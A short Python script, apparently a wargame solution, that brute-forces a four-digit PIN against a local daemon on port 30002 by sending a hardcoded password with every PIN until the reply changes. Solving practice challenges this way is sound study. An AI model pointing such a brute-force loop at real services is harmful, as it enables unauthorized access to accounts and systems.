import socket

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(("127.0.0.1", 30002))
    data = s.recv(1024).decode().strip()
    print(data)

    for pin in range(10000):
        s.send(b'gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ' + str(pin).encode() + b'\n')
        data = s.recv(1024).decode().strip()
        
        if "Wrong!" not in data:
            print(pin,':',data)
            break

    s.close()